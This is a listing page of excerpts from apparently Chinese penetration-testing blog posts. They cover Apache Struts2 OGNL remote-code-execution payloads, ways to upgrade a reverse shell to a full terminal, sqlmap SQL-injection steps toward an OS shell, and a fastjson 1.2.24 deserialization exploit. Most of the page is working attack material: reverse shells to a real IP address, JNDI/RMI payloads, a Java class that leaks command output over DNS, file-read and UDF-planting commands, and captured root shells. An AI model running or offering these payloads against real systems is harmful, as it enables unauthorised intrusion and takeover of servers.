%25<span class="o">{</span><span class="c">#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c","/bin/bash -i &gt;&amp; /dev/tcp/47.52.233.92/12341 0&gt;&amp; 1"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 12341
Listening on 0.0.0.0 12341
Connection received on 120.242.209.224 17321
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@9485ca31e963:/usr/local/tomcat# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<h1 id="s2-013">s2-013</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?url<span class="o">=</span>%24%7B%28%23_memberAccess%5B<span class="s2">"allowStaticMethodAccess"</span>%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%29%7D
</code></pre></div></div>

<h1 id="struts2-dev-mode">struts2-dev-mode</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">debug</span><span class="o">=</span><span class="nb">command</span>&amp;expression<span class="o">=</span>%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
</code></pre></div></div>

<h1 id="s2-057">s2-057</h1>

<blockquote>
  <p>影响版本: &lt;= Struts 2.3.34, Struts 2.5.16</p>
</blockquote>

<p>访问<code class="language-plaintext highlighter-rouge">http://localhost:8080/${(111+111)}/actionChain1.action</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Requst包
GET /<span class="nv">$%</span>7B<span class="o">(</span>111+111<span class="o">)</span>%7D/actionChain1.action HTTP/1.1
Host: vuln_s2_ip:8080
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, 
  like Gecko<span class="o">)</span> Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,image/ap
ng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
Cookie: <span class="nv">JSESSIONID</span><span class="o">=</span>6567848243F5C10BA42DA6C8222FFC32
Connection: close
+------------------------++------------------------++------------------------+
+------------------------++------------------------++------------------------+

Response包：
HTTP/1.1 302 
Location: /222/register2.action
Content-Length: 0
Date: Wed, 27 May 2020 06:21:06 GMT
Connection: close

</code></pre></div></div>
<p>我们看到<code class="language-plaintext highlighter-rouge">${(111+111)}</code>表达式已经被计算</p>

          <p><a href="/blog/2020/Apache/Strut2/Vuln/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/get/TTY/terminal/"><h3 class="ctitle">「BASH」:谈谈如何获取完全交互式终端</h3></a>
          <p><csmall>May 20, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>写在前面，本方法适用于在反弹shell后把shell提升为完全交互式shell，也是自己实战了一段时间后摸索出来的，记一下笔记；</p>
<h1 id="完美的交互式shell">完美的交互式shell</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
Ctrl-Z
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg
</span>reset
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
//<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></div></div>

<p>同样的，我在网上也找到另外一种方式：<code class="language-plaintext highlighter-rouge">script /dev/null/</code>这样：同理，也可以通过同样的方式获取到交互式shell：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null
Ctrl-Z
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg
</span>reset
</code></pre></div></div>
<p>这样我们在终端某个命令时，输入<code class="language-plaintext highlighter-rouge">ctrl+c</code>或者<code class="language-plaintext highlighter-rouge">ctrl+z</code>就不会直接中断shell。
这里转载搜到信息来进行展示，供大家参考：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty</span> <span class="nt">-echo</span>	<span class="c">#禁止回显，当在键盘上输入时，并不出现在屏幕上</span>
<span class="nb">stty echo</span> 	<span class="c">#打开回显</span>
<span class="nb">stty </span>raw 	<span class="c">#设置原始输入</span>
<span class="nb">stty</span> <span class="nt">-raw</span>	<span class="c">#关闭原始输入</span>
<span class="nb">bg</span>			<span class="c">#将一个在后台暂停的命令，变成继续执行</span>
<span class="nb">fg</span>			<span class="c">#将后台中的命令调至前台继续运行</span>
<span class="nb">jobs</span>		<span class="c">#查看当前有多少在后台运行的命令</span>
ctrl+z 		<span class="c">#可以将一个正在前台执行的命令放到后台，并且暂停</span>
clear  		<span class="c">#这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。</span>
reset 		<span class="c">#这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空</span>
</code></pre></div></div>
<p>来源：<a href="https://saucer-man.com/information_security/233.html#cl-3">实现交互式shell的几种方式</a></p>

<h1 id="socat">socat</h1>

<p>目标机</p>

<p>把socat上传到目标机器上或者直接下载</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat <span class="nt">-O</span> /tmp/socat

vuln_ip:
<span class="nb">chmod</span> +x /tmp/socat
./tmp/socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:47.52.233.92:4444
<span class="nt">--</span>
attack machine
socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:4444
</code></pre></div></div>

<h1 id="stty行列数">stty行列数:)</h1>
<p>有的时候终端写入的命令太长，而终端行列不够长来显示所以会导致命令重叠、错杂，我们可以用下面的方法来让我们用这个shell用的更舒服点；</p>

<p>先看看自己机器上的stty配置信息:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu20-free:~# <span class="nb">stty</span> <span class="nt">-a</span>
speed 9600 baud<span class="p">;</span> rows 35<span class="p">;</span> columns 148<span class="p">;</span> line <span class="o">=</span> 0<span class="p">;</span>
intr <span class="o">=</span> ^C<span class="p">;</span> quit <span class="o">=</span> ^<span class="se">\;</span> erase <span class="o">=</span> ^?<span class="p">;</span> <span class="nb">kill</span> <span class="o">=</span> ^U<span class="p">;</span> eof <span class="o">=</span> ^D<span class="p">;</span> eol <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> eol2 <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> swtch <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> start <span class="o">=</span> ^Q<span class="p">;</span> stop <span class="o">=</span> ^S<span class="p">;</span> susp <span class="o">=</span> ^Z<span class="p">;</span> rprnt <span class="o">=</span> ^R<span class="p">;</span>
werase <span class="o">=</span> ^W<span class="p">;</span> lnext <span class="o">=</span> ^V<span class="p">;</span> discard <span class="o">=</span> ^O<span class="p">;</span> min <span class="o">=</span> 1<span class="p">;</span> <span class="nb">time</span> <span class="o">=</span> 0<span class="p">;</span>
<span class="nt">-parenb</span> <span class="nt">-parodd</span> <span class="nt">-cmspar</span> cs8 <span class="nt">-hupcl</span> <span class="nt">-cstopb</span> cread <span class="nt">-clocal</span> <span class="nt">-crtscts</span>
<span class="nt">-ignbrk</span> <span class="nt">-brkint</span> <span class="nt">-ignpar</span> <span class="nt">-parmrk</span> <span class="nt">-inpck</span> <span class="nt">-istrip</span> <span class="nt">-inlcr</span> <span class="nt">-igncr</span> icrnl ixon <span class="nt">-ixoff</span> <span class="nt">-iuclc</span> <span class="nt">-ixany</span> <span class="nt">-imaxbel</span> <span class="nt">-iutf8</span>
opost <span class="nt">-olcuc</span> <span class="nt">-ocrnl</span> onlcr <span class="nt">-onocr</span> <span class="nt">-onlret</span> <span class="nt">-ofill</span> <span class="nt">-ofdel</span> nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten <span class="nb">echo </span>echoe echok <span class="nt">-echonl</span> <span class="nt">-noflsh</span> <span class="nt">-xcase</span> <span class="nt">-tostop</span> <span class="nt">-echoprt</span> echoctl echoke <span class="nt">-flusho</span> <span class="nt">-extproc</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">speed 9600 baud; rows 35; columns 148; line = 0;</code>这一段是我们所需要的信息；</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rows 35<span class="p">;</span> columns 148
配置我们的shell如下：
<span class="nv">$ </span><span class="nb">stty </span>rows 35 cols 148
</code></pre></div></div>

<h1 id="其他痛点">其他痛点</h1>
<p>有的时候感觉terminal上太多命令了，用着用着会习惯性输入命令<code class="language-plaintext highlighter-rouge">clear</code>，然后你们就会看到如下现象：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># clear</span>

TERM environment variable not set.

<span class="c"># set |grep TERM</span>

<span class="nv">TERM</span><span class="o">=</span>dumb
</code></pre></div></div>
<p>如上，看term的配置信息，最后解决办法如下，设置term为<code class="language-plaintext highlighter-rouge">xterm</code>就可以了。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># export TERM=xterm</span>

<span class="c"># set |grep TERM</span>
<span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nv">_</span><span class="o">=</span>TERM
</code></pre></div></div>
<p>之后就可以随意的clear清除命令辣！</p>

          <p><a href="/blog/2020/get/TTY/terminal/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/SQL/SHELL/"><h3 class="ctitle">「SQL注入」:SQL-SHELL</h3></a>
          <p><csmall>May 20, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h3 id="sqlmap注入方法">sqlmap注入方法</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">--current-user</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">--tables</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">-T</span> systemUser <span class="nt">--columns</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">-T</span> systemUser <span class="nt">-C</span> <span class="nb">id</span>,password,userName

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">--file-read</span><span class="o">=</span><span class="s2">"/etc/passwd"</span>

sql-shell&gt; <span class="k">select </span>load_file<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>查看数据库信息和系统版本
sql-shell&gt; <span class="k">select</span> @@version
<span class="o">[</span>14:29:22] <span class="o">[</span>INFO] fetching SQL SELECT statement query output: <span class="s1">'select @@version'</span>
<span class="k">select</span> @@version:    <span class="s1">'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \n\tApr  2 2010 15:48:46 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)\n'</span>

验证是否为sa权限
sql-shell&gt; <span class="k">select </span>IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
<span class="o">[</span>14:30:08] <span class="o">[</span>INFO] fetching SQL SELECT statement query output: <span class="s1">'select IS_SRVROLEMEMBER('</span>sysadmin<span class="s1">')'</span>
<span class="k">select </span>IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>:    <span class="s1">'1'</span>

判断目标机的MSSQL服务是否存在<span class="sb">`</span>xp_cmdshell<span class="sb">`</span>扩展存储过程：
sql-shell&gt; <span class="k">select </span>count<span class="o">(</span><span class="k">*</span><span class="o">)</span> from master.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span><span class="s1">'x'</span> and <span class="nv">name</span><span class="o">=</span><span class="s1">'xp_cmdshell'</span><span class="p">;</span>
<span class="o">[</span>14:31:00] <span class="o">[</span>INFO] fetching SQL SELECT statement query output: <span class="s1">'select count(*) from master.dbo.sysobjects where xtype='</span>x<span class="s1">' and name='</span>xp_cmdshell<span class="s1">''</span>
<span class="k">select </span>count<span class="o">(</span><span class="k">*</span><span class="o">)</span> from master.dbo.sysobjects where <span class="nv">xtype</span><span class="o">=</span><span class="s1">'x'</span> and <span class="nv">name</span><span class="o">=</span><span class="s1">'xp_cmdshell'</span><span class="p">;</span>:    <span class="s1">'1'</span>
只要返回结果不是<span class="sb">`</span>0<span class="sb">`</span>就说明存在<span class="sb">`</span>xp_cmdshell<span class="sb">`</span>扩展存储过程。
</code></pre></div></div>
<h3 id="遇到问题">遇到问题</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sql-shell&gt; Exec master..xp_cmdshell <span class="s1">'whoami'</span><span class="p">;</span>
<span class="o">[</span>14:32:58] <span class="o">[</span>WARNING] execution of non-query SQL statements is only available when stacked queries are supported
</code></pre></div></div>

<h3 id="how">how</h3>
<p>sqlmap -r /home/tool/sqlmap-data/wsdl-inject/net-test1.txt –batch –file-read=”C:\Windows\win.ini”</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>14:24:08] <span class="o">[</span>INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
<span class="o">[</span>14:24:08] <span class="o">[</span>ERROR] none of the SQL injection techniques detected can be used to <span class="nb">read </span>files from the underlying file system of the back-end Microsoft SQL Server server
</code></pre></div></div>

<h3 id="os-shell">?os-shell?</h3>
<p>mysql:
select password(‘’),concat(‘*‘,sha1(unhex(sha1(‘’))));
sqlmap -d “mysql://root:Hehe123456@192.168.192.120:3306/test” –os-shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="s2">"hex"</span> into outfile <span class="s2">"D:/phpStudy/MySQL/lib/plugin/udf.dll"</span>
</code></pre></div></div>

<p>CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’;</p>

          <p><a href="/blog/2020/SQL/SHELL/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/fastjson/UNdeser/"><h3 class="ctitle">「fastjson」:浅谈json的反序列化</h3></a>
          <p><csmall>May 19, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h3 id="fastjson指纹特征">fastjson指纹特征</h3>
<p>访问页面，查看反包是一个指定的json格式的数据。请求包：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: underattack-host:8090
Cache-Control: max-age<span class="o">=</span>0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
Connection: close
</code></pre></div></div>
<p>反包：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Length: 28
Date: Tue, 19 May 2020 01:05:29 GMT
Connection: close

<span class="o">{</span>
    <span class="s2">"age"</span>:25,
    <span class="s2">"name"</span>:<span class="s2">"Bob"</span>
<span class="o">}</span>
</code></pre></div></div>
<p>如上的请求和反包。我们知道了json的格式直接构造参数，给服务器发包看看：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
Host: underattack-host:8090
Cache-Control: max-age<span class="o">=</span>0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/json
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
Connection: close
Content-Length: 26

<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"hello"</span>, <span class="s2">"age"</span>:20<span class="o">}</span>
</code></pre></div></div>
<p>反包：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Length: 30
Date: Tue, 19 May 2020 01:06:20 GMT
Connection: close

<span class="o">{</span>
    <span class="s2">"age"</span>:20,
    <span class="s2">"name"</span>:<span class="s2">"hello"</span>
<span class="o">}</span>
</code></pre></div></div>
<p>我们看到服务器端返回包为我们构造的包。</p>

<h4 id="fastjson-1224-反序列化导致任意命令执行漏洞">fastjson 1.2.24 反序列化导致任意命令执行漏洞</h4>
<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>

<p>参考资料：</p>
<ul>
  <li>https://www.freebuf.com/vuls/208339.html</li>
  <li>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</li>
</ul>

<p>首先编译并上传命令执行代码</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## cat dnslog.java</span>

import java.lang.Runtime<span class="p">;</span>
import java.lang.Process<span class="p">;</span>

public class dnslog <span class="o">{</span>
    static <span class="o">{</span>
        try <span class="o">{</span>
            Runtime rt <span class="o">=</span> Runtime.getRuntime<span class="o">()</span><span class="p">;</span>
            String[] commands <span class="o">=</span> <span class="o">{</span><span class="s2">"/bin/sh"</span>, <span class="s2">"-c"</span>, <span class="s2">"ping user.</span><span class="sb">`</span><span class="nb">whoami</span><span class="sb">`</span><span class="s2">.c08aqu.dnslog.cn"</span><span class="o">}</span><span class="p">;</span>
            Process pc <span class="o">=</span> rt.exec<span class="o">(</span>commands<span class="o">)</span><span class="p">;</span>
            pc.waitFor<span class="o">()</span><span class="p">;</span>
        <span class="o">}</span> catch <span class="o">(</span>Exception e<span class="o">)</span> <span class="o">{</span>
            // <span class="k">do </span>nothing
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>编译：<code class="language-plaintext highlighter-rouge">javac dnslog.java</code>。生成class文件；然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并指定受害机器访问9999端口后，去加载远程服务器的类<code class="language-plaintext highlighter-rouge">dnslog.class</code>，而class文件就是执行command。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/mbechler/marshalsec.git

<span class="nb">cd </span>marshalsec

mvn clean package <span class="nt">-DskipTests</span> <span class="c">##看到BUILD SUCCESS后进入target</span>

<span class="nb">cd </span>target

java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="s2">"https://www.chihou.pro/##dnslog"</span> 9999

<span class="k">*</span> Opening JRMP listener on 9999
</code></pre></div></div>

<p>开启监听。向靶场服务器发送Payload，带上RMI的地址：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST数据：
<span class="o">{</span>
    <span class="s2">"b"</span>:<span class="o">{</span>

        <span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,

        <span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://47.52.233.92:9999/dnslog"</span>,

        <span class="s2">"autoCommit"</span>:true
    <span class="o">}</span>
<span class="o">}</span>
<span class="nt">----</span>
<span class="o">{</span>
    <span class="s2">"name"</span>:<span class="o">{</span>
        <span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,
        <span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="o">}</span>,

    <span class="s2">"x"</span>:<span class="o">{</span>

        <span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,
        <span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,
        <span class="s2">"autoCommit"</span>:true
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>发送完毕后检查RMI服务器的监听记录：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> Opening JRMP listener on 9999
Have connection from /61.133.171.114:11430
Reading message...
Is RMI.lookup call <span class="k">for </span>dnslog 2
Sending remote classloading stub targeting https://www.chihou.pro/dnslog.class
Closing connection
</code></pre></div></div>
<p>受害机器已经访问了我们的服务器，最后检查是否执行dnslog命令；</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
</code></pre></div></div>
<p>可见，<code class="language-plaintext highlighter-rouge">ping</code>命令已成功执行;</p>

<p>######## 反弹shell
同样的，直接在poc代码里修改反弹shell的代码即可。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import java.lang.Runtime<span class="p">;</span>
import java.lang.Process<span class="p">;</span>

public class nc <span class="o">{</span>
    static <span class="o">{</span>
    
        try<span class="o">{</span>
        Runtime rt <span class="o">=</span> Runtime.getRuntime<span class="o">()</span><span class="p">;</span>
        String[] commands <span class="o">=</span> <span class="o">{</span><span class="s2">"/bin/bash"</span>,<span class="s2">"-c"</span>,<span class="s2">"bash -i &gt;&amp; /dev/tcp/47.52.233.92/12341 0&gt;&amp; 1"</span><span class="o">}</span><span class="p">;</span>
        Process pc <span class="o">=</span> rt.exec<span class="o">(</span>commands<span class="o">)</span><span class="p">;</span>
        pc.waitFor<span class="o">()</span><span class="p">;</span>
        <span class="o">}</span>catch <span class="o">(</span>Exception e<span class="o">)</span> <span class="o">{</span>
        //no
        <span class="o">}</span>
    
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>同理即可获得反弹shell：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## nc -lvnp 12341</span>
Listening on 0.0.0.0 12341
Connection received on 120.242.209.70 3450
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@5a8812147218:/## <span class="nb">whoami
whoami
</span>root
</code></pre></div></div>

<h4 id="dnslog">dnslog</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"rand1"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.InetAddress"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand2"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.Inet4Address"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand3"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.Inet6Address"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

<span class="o">{</span><span class="s2">"rand4"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.InetSocketAddress"</span><span class="o">{</span><span class="s2">"address"</span>:,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}}</span>

<span class="o">{</span><span class="s2">"rand5"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span>

一些畸形payload，不过依然可以触发dnslog：
<span class="o">{</span><span class="s2">"rand6"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.alibaba.fastjson.JSONObject"</span>, <span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.net.URL"</span>, <span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}}</span><span class="s2">""</span><span class="o">}}</span>
<span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.lang.AutoCloseable"</span>


<span class="o">{</span><span class="s2">"rand7"</span>:Set<span class="se">\[</span><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span><span class="se">\]</span><span class="o">}</span>

